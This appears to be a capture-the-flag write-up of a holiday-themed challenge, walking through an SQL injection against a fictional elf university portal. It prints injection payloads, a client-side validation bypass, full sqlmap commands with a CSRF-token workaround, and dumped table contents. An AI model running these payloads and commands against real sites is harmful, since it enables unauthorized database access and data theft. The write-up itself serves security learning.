# 9) Retrieve Scraps of Paper from Server
This one sends us to a website... which probably has an injection vuln.
Let's see!
1. Check application status sounds odd, let's focus on that field.
1. Let's try "a@a.com" -> application status is pending (good, someone already registered for us haha 😉)
1. Let's try:
    ```SQL
    a@a.com' OR 1=1;-- -
    ```
    and we get an error message that the email field can't contain ' in it.
    Hmm, let's check the validation script... rabbit hole, it's a simple post html page.
    So... let's change the html (cause I'm lazy and just want to fingerprint) to be a text post instead of an email post so the browser doesn't validate it for us:
    ```html
    <input name="elfmail" type="email" id="inputEmail" class="form-control form-control-lg" placeholder="Email address" required="" autofocus="">
    ```
    becomes
    ```html
    <input name="elfmail" type="text" id="inputEmail" class="form-control form-control-lg" placeholder="Email address" required="" autofocus="">
    ```
1. Now let's try inputting "a@a.com' OR 1=1;-- -"

    Result: no error (good!)

1. Now let's try inputting "'OR 1=1;-- -'

    Result: no error (good!)
1. Now let's fingerprint. http://www.sqlinjection.net/database-fingerprinting/ has some good tips, let's try:
    ```SQL
    a' '@a.com
    ```
    and we get an error message! Bingo!
    ```
    Error: SELECT status FROM applications WHERE elfmail = ''a' '@a.com'';
    You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'a' '@a.com''' at line 1
    ```
    This is good as we're not flying blind here now. We've now identified the SQL version used (MariaDB) as well as the table name "status" and column name "applications" and variable name "elfmail" which is pretty significant. Now we can throw it into SQL map and dump the database :D
    ```SQL
    ' OR 1=1 UNION ALL (SELECT * FROM applications) LIMIT 10;-- -
    ```
    error:
    ```
    Error: SELECT status FROM applications WHERE elfmail = '' OR 1=1 UNION ALL (SELECT * FROM applications) LIMIT 10;-- -';
    The used SELECT statements have a different number of columns
    ```
    ... trying SQLMap, we see that
    ```powershell
    python sqlmap.py -u https://studentportal.elfu.org/application-check.php --data='a@a.com' --csrf-url='https://studentportal.elfu.org/check.php' --csrf-token='token'
    ```
    doesn't work, because we see that the html calls:
    ```javascript
    function submitApplication() {
      console.log("Submitting");
      elfSign();
      document.getElementById("check").submit();
    }
    function elfSign() {
      var s = document.getElementById("token");

      const Http = new XMLHttpRequest();
      const url='/validator.php';
      Http.open("GET", url, false);
      Http.send(null);

      if (Http.status === 200) {
        console.log(Http.responseText);
        s.value = Http.responseText;
      }

    }
    ```
    first!
    Let's modify the csrf validation portion of SQLMap cause that will tie in nicely with the script and we won't have to change much else. The CSRF should instead download the validator.php page and spit it out as the variable. That should be pretty simple.
    Doing some OSINT we find that https://github.com/sqlmapproject/sqlmap/commit/780dbd1c64690726eed291e77f9a2fc12d230610 implements the CSRF check, so we can search the repo for conf.csrfToken and find that it gets set in https://github.com/sqlmapproject/sqlmap/blob/7dae324ed6ca4b7a49c4f6d3a9d0c83925a87614/lib/request/connect.py
    Let's modify the code to do a post to grab the validator.php page first and then convert it to a csrf token.

    to be ... AND STOP future me is coming to tell something that I learned painfully.
    Always check if the request is GET or POST. In this case it was GET. I assumed POST. Thankfully, with verbosity = 6, we found it out, but it took wayyyy too long.

    Now that we've modified the code SQLMap is happily running with the following command:
    ```powershell
    python sqlmap.py -u 'https://studentportal.elfu.org/application-check.php?elfmail=a&token=a' --method GET -p elfmail --dbms "MySQL" --prefix="a@a.com' " --csrf-url='https://studentportal.elfu.org/validator.php' --csrf-token='token' --time-sec=10 --string='still'
    ```
    whew that took far too long to correct. :D
    That query is taking some time, even after it found a viable exploit, so let's skip ahead and run:
    ```powershell
    python sqlmap.py -u 'https://studentportal.elfu.org/application-check.php?elfmail=a&token=a' --method GET -p elfmail --dbms "MySQL" --prefix="a@a.com' " --csrf-url='https://studentportal.elfu.org/validator.php' --csrf-token='token' --time-sec=10 --string='still' --dbs
    # lists elfu and information_schema
    python sqlmap.py -u 'https://studentportal.elfu.org/application-check.php?elfmail=a&token=a' --method GET -p elfmail --dbms "MySQL" --prefix="a@a.com' " --csrf-url='https://studentportal.elfu.org/validator.php' --csrf-token='token' --time-sec=10 --string='still' --tables -D elfu
    # lists krampus, applications, and students
    python sqlmap.py -u 'https://studentportal.elfu.org/application-check.php?elfmail=a&token=a' --method GET -p elfmail --dbms "MySQL" --prefix="a@a.com' " --csrf-url='https://studentportal.elfu.org/validator.php' --csrf-token='token' --time-sec=10 --string='still' --dump -D elfu -T krampus
    # dumps 6 picture URLs:
    1,/krampus/0f5f510e.png
    2,/krampus/1cc7e121.png
    3,/krampus/439f15e6.png
    4,/krampus/667d6896.png
    5,/krampus/adb798ca.png
    6,/krampus/ba417715.png
    ```
1. Piecing together the images, we find the message contains:
```
From the Desk of <unreadable>

Date: August 23, 20<unreadable>

Memo to Self:

Finally! I've figured out how to destroy Christmas!
Santa has a brand new, cutting edge sleigh guidance
technology, called the Super Sled-o-matic.

I've figured out a way to poison the data going into the
system so that it will divert Santa's sled on Christmas
Eve!

Santa will be unable to make the trip and the holiday
season will be destroyed! Santa's own technology will
undermine him!

That's what they deserve for not listening to my
suggestions for supporting other holiday characters!

Bwahahahahaha!
```
1. This gives us the answer, "Super Sled-o-matic"

Bonus:
Let's dump the student database (the application database will probably be huge, but the student database might have something useful):
```powershell
python sqlmap.py -u 'https://studentportal.elfu.org/application-check.php?elfmail=a&token=a' --method GET -p elfmail --dbms "MySQL" --prefix="a@a.com' " --csrf-url='https://studentportal.elfu.org/validator.php' --csrf-token='token' --time-sec=10 --string='still' --dump -D elfu -T students
```
Result:
```csv
id,bio,name,degree,student_number
1,My goal is to be a happy elf!,Elfie,Raindeer Husbandry,392363902026
2,"I'm just a elf. Yes, I'm only a elf. And I'm sitting here on Santa's sleigh, it's a long, long journey To the christmas tree. It's a long, long wait while I'm tinkering in the factory. But I know I'll be making kids smile on the holiday... At least I hope and pray that I will But today. I'm still ju",Elferson,Dreamineering,39210852026
3,Have you seen my list??? It is pretty high tech!,Alabaster Snowball,Geospatial Intelligence,392363902026
4,I am an engineer and the inventor of Santa's magic toy-making machine.,Bushy Evergreen,Composites and Engineering,392363902026
5,My goal is to be a happy elf!,Wunorse Openslae,Toy Design,39236372526
6,My goal is to be a happy elf!,Bushy Evergreen,Present Wrapping,392363128026
7,Check out my makeshift armour made of kitchen pots and pans!!!,Pepper Minstix,Reindeer Husbandry,392363902026
8,My goal is to be a happy elf!,Sugarplum Mary,Present Wrapping,5682168522137
9,Santa and I are besties for life!!!,Shinny Upatree,Holiday Cheer,228755779218
```
Not useful after all, but maybe the student number will be useful later. :(